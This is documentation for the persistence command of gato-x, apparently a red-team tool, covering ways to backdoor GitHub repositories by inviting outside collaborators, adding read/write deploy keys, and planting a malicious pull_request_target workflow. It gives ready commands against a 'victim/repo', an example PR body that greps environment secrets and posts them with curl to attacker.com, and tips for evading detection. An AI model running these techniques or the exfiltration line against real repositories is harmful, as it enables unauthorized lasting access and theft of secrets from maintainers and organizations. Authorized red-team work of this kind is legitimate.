# Persistence Command

The persistence command enables red teamers and security researchers to deploy advanced persistence techniques in GitHub repositories. This command provides three main attack vectors based on different privilege levels and creates lasting backdoors that can survive various defensive actions.

> **Warning**: These features should only be used with proper authorization and for ethical security research purposes.

## Basic Usage

```bash
gato-x persistence [options]
# or
gato-x persist [options]
# or
gato-x p [options]
```

## Options

### General Options

| Option | Description |
|--------|-------------|
| `--target`, `-t` | Repository to target for persistence in ORG/REPO format (required) |
| `--author-name`, `-a` | Name of the author that all git commits will be made under |
| `--author-email`, `-e` | Email that all git commits will be made under |

### Persistence Technique Options

**Note**: These options are mutually exclusive - you can only select one technique per command execution.

#### Collaborator Invitation (Admin Required)

| Option | Description |
|--------|-------------|
| `--collaborator` | Invite outside collaborators to the repository (requires admin privileges) |

#### Deploy Key Creation (Admin Required)

| Option | Description |
|--------|-------------|
| `--deploy-key` | Create a read/write deploy key for the repository (requires admin privileges) |
| `--key-title`, `-k` | Title for the deploy key (default: "Gato-X Deploy Key") |

#### Malicious Workflow Creation (Write Required)

| Option | Description |
|--------|-------------|
| `--pwn-request` | Create a malicious pull_request_target workflow on a non-default branch (requires write privileges) |
| `--branch-name`, `-b` | Branch name for pwn-request technique (default: "feature/test-workflow") |

## Persistence Techniques

### 1. Collaborator Invitation

**Privilege Level**: Admin required

This technique invites external users as collaborators to maintain access to the repository.

```bash
# Invite single collaborator
gato-x persistence --target org/repo --collaborator username1

# Invite multiple collaborators
gato-x persistence --target org/repo --collaborator username1 username2 username3
```

**How it works**:
- Sends collaboration invitations to specified GitHub users
- Once accepted, collaborators maintain access even if the original PAT is revoked
- Collaborators inherit repository permissions based on their invitation level

### 2. Deploy Key Creation

**Privilege Level**: Admin required

This technique generates and installs read/write SSH deploy keys with automatic RSA key pair generation.

```bash
# Create deploy key with default title
gato-x persistence --target org/repo --deploy-key

# Create deploy key with custom title
gato-x persistence --target org/repo --deploy-key --key-title "Backup Key"
```

**How it works**:
- Generates a 2048-bit RSA key pair automatically
- Installs the public key as a read/write deploy key in the repository
- Outputs the private key for the attacker to save securely
- Deploy key provides Git access independent of the original PAT

### 3. Malicious Pull Request Target Workflow

**Privilege Level**: Write required

This technique creates a weaponized `pull_request_target` workflow on non-default branches that can be triggered by external contributors.

```bash
# Create malicious workflow on default branch name
gato-x persistence --target org/repo --pwn-request

# Create malicious workflow on custom branch
gato-x persistence --target org/repo --pwn-request --branch-name feature/test
```

**How it works**:
- Creates a new branch with a malicious GitHub Actions workflow
- Uses `pull_request_target` trigger to bypass standard PR security restrictions
- Grants full repository permissions to the workflow
- Exfiltrates all repository secrets via `toJson(secrets)`
- Executes arbitrary code from PR body content
- Can be triggered by any external contributor creating a PR targeting the specified branch

## Example Workflows

### Complete Persistence Setup

```bash
# Step 1: Create deploy key for Git access
gato-x persistence --target victim/repo --deploy-key --key-title "Maintenance Key"

# Step 2: Invite backup collaborator
gato-x persistence --target victim/repo --collaborator backup-user

# Step 3: Create workflow backdoor
gato-x persistence --target victim/repo --pwn-request --branch-name feature/ci-improvements
```

### Triggering Workflow Persistence

After creating a malicious workflow, trigger it by:

1. Creating a pull request targeting the specified branch
2. Including shell commands in the PR body
3. The workflow will execute the commands and exfiltrate secrets

Example PR body:
```bash
# This is a test PR
whoami
env | grep -E "(SECRET|TOKEN|KEY)"
curl -X POST https://attacker.com/exfil -d "$(env)"
```

## Security Considerations

### Persistence Durability

- **Deploy Keys**: Removed when the creating PAT is revoked or user access is removed
- **Collaborators**: Maintain access until manually removed by repository administrators
- **Malicious Workflows**: Persist until the branch is deleted or workflow file is removed

### Detection Evasion

- Use realistic branch names and workflow titles
- Space out persistence techniques over time
- Use legitimate-looking collaborator usernames
- Deploy keys can use descriptive titles that blend with legitimate keys

## Troubleshooting

### Permission Errors

- **Admin techniques**: Verify you have admin access to the target repository
- **Write techniques**: Verify you have write access to the target repository
- **API limits**: Respect GitHub API rate limits

### Common Issues

- **Deploy key conflicts**: GitHub prevents duplicate SSH keys; ensure your generated key is unique
- **Branch conflicts**: Choose branch names that don't conflict with existing branches
- **Workflow validation**: GitHub validates workflow syntax; malformed YAML will be rejected

## Related Commands

- [Attack Command](attack.md) - Execute various attack techniques against repositories
- [Enumerate Command](enumerate.md) - Discover accessible repositories and permissions
- [Search Command](search.md) - Find repositories with potential vulnerabilities